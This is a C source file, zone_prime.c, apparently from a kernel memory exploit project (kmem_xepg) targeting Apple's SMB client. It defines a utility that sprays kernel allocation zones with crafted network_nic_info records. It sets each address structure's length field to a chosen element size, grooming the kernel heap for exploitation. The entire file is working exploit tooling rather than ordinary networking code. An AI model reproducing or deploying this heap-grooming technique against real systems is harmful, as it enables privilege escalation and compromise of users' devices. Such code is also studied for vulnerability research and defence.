//
//  zone_prime.c
//  kmem_xepg
//
//  Created by admin on 12/27/21.
//

#include <stdlib.h>
#include <string.h>
#include <stdatomic.h>

#include <xe/util/misc.h>
#include <xe/util/assert.h>

#include "../smb/nic_allocator.h"

#include "zkext_prime_util.h"


struct kmem_zkext_prime_util {
    smb_nic_allocator small_allocator;
    _Atomic uint32_t alloc_index;
};


kmem_zkext_prime_util_t kmem_zkext_prime_util_create(const struct sockaddr_in* smb_addr) {
    struct kmem_zkext_prime_util* util = malloc(sizeof(struct kmem_zkext_prime_util));
    util->small_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    return util;
}


void kmem_zkext_prime_util_prime(kmem_zkext_prime_util_t util, uint num_elements, uint z_elem_size) {
    xe_assert(z_elem_size <= 256);
    uint8_t alloc_size = xe_min(z_elem_size, UINT8_MAX);
    uint num_allocs = num_elements;
    if (alloc_size > 16 && alloc_size <= 32) {
        num_allocs /= 2;
    }
    
    uint alloc_idx_start = atomic_fetch_add(&util->alloc_index, num_allocs);
    xe_assert(alloc_idx_start + num_allocs > alloc_idx_start);
    
    uint infos_size = sizeof(struct network_nic_info) * num_allocs;
    struct network_nic_info* infos = malloc(infos_size);
    bzero(infos, infos_size);
    
    for (int i=0; i<num_allocs; i++) {
        struct network_nic_info* info = &infos[i];
        info->nic_index = i;
        info->addr_4.sin_len = alloc_size;
        info->addr_4.sin_addr.s_addr = alloc_idx_start + i;
        info->addr_4.sin_family = AF_INET;
        info->next_offset = sizeof(*info);
    }
    
    int error = smb_nic_allocator_allocate(util->small_allocator, infos, num_allocs, infos_size);
    xe_assert_err(error);
    free(infos);
}


void kmem_zkext_prime_util_destroy(kmem_zkext_prime_util_t* util_p) {
    kmem_zkext_prime_util_t util = *util_p;
    int error = smb_nic_allocator_destroy(&util->small_allocator);
    xe_assert_err(error);
    free(util);
    *util_p = NULL;
}
